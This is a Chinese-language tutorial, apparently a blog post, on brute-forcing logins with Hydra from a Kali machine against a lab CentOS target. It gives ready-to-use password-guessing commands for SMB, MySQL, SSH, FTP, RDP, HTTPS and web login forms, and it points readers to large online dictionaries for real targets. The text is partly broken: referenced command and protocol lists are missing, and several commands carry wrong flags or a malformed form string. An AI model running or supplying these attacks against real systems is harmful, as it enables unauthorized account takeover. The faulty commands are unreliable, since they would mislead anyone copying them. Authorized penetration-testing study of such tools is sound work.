# 原创
：  19-5 hydra爆破

# 19-5 hydra爆破

#### 导语

        Hydra 是一个用于暴力破解登录凭据的网络安全工具。它可以通过尝试多个用户名和密码组合来攻击目标系统，以获得未经授权的访问权限。

        Hydra 支持多种协议和服务，包括常见的 SSH、FTP、Telnet、HTTP、SMTP 等。它可以通过使用字典文件或生成密码的模式进行强制破解。可以通过命令行参数来配置 Hydra 的行为，例如指定要攻击的目标、设置并发连接数、定义用户名和密码列表等。

        由于 Hydra 是一种攻击工具，因此在使用时需要小心谨慎，并遵循法律和道德规范。它通常用于渗透测试和安全评估，以帮助发现系统中存在的安全漏洞，并加强对这些漏洞的防范。

#### Hydra常用命令

以上是Hydra的常用命令，可以根据需要选择适当的选项进行暴力破解。请注意，在使用Hydra进行安全测试时，必须遵守法律和道德规范，并且仅在授权的系统上进行测试。

**Hydra是一个强大的密码爆破工具，支持多种服务和协议。以下是一些Hydra支持的常见服务和协议：**

这只是一部分Hydra支持的服务和协议列表，还有其他更多的服务和协议可供使用。请注意，在使用Hydra进行密码爆破时，确保遵守法律法规和获得适当的授权。

#### 环境准备： 

kali作为攻击机（自带Hydra），再找一台虚拟机作为靶机（我这里用 CentOS 7）。[构建完善的安全渗透测试环境：推荐工具、资源和下载链接_渗透测试靶机下载-CSDN博客](https://blog.csdn.net/weixin_43263566/article/details/129031187)

查看一下靶机（CentOS 7）的ip

```
ifconfig
```

#### Hydra使用示例： 

##### 1）Windows系统密码破解：

SMB服务稳定且速度快，不容易被封禁IP。

```
hydra -I 用户名 -p 密码 smb://ip -v
```

或者

```
hydra -l 用户名 -p 密码 smb://ip -v // -v（显示爆破详细信息）
```

##### 2）MySQL密码破解：

数据库通常会提供默认账户，如SQL Server的sa用户、MySQL的root用户、Oracle的System用户等。以下是破解MySQL数据库的示例：

```
hydra -L 用户名列表文件 -P 密码列表文件 ip mysql
```

或者

```
hydra -L 用户名列表文件 -P 密码列表文件 mysql://目标IP -mysql 端口号
```

##### 3）SSH密码破解：

```
hydra -l 用户名 -P 密码字典文件 -t 线程数 -vV -e -nsr ip ssh
```

我这里自己写了几个简单的用户、密码字典用做演示

开始爆破，我这里是用自己写的简单字典文件，如果是真实环境可以上gitee、github下载详细的字典进行爆破（如果要爆破其他服务协议就将命令后面的ssh改成需要的服务名就行）

```
hydra -L /home/kali/桌面/user.txt -P /home/kali/桌面/pass.txt -t 16 -vV 192.168.1.5 ssh 
```

##### 4）FTP密码破解：

```
hydra -L 用户名列表文件 -P 密码字典文件 -t 线程数 -o save.log -vV ip ftp
```

如果目标FTP不在默认的21端口上，可以使用-s参数指定正确的端口。

##### 5）RDP密码破解：

如果不支持RDP模块，请尝试升级Hydra，命令：apt install hydra

```
hydra ip rdp -l administrator -P pass.txt -V
```

##### 6）HTTPS密码破解：

```
hydra -m /index.php -l 用户名 -P 密码字典文件 目标ip https
```

##### 7）使用GET方式提交破解Web登录：

```
hydra -l 用户名 -p 密码字典文件 -t 线程数 -vV -e -ns 目标ip http-get /web/
```

##### 8）使用POST方式提交破解Web登录：

```
hydra -l admin -p small.txt 域名/ip -s 端口号 http-post-form "Pass-09/index.phpusername=^USER^&amp;password=^PASS^&amp;Login=LoginF=密码错误" -v
```

其中，F表示错误信息。根据实际情况填写。
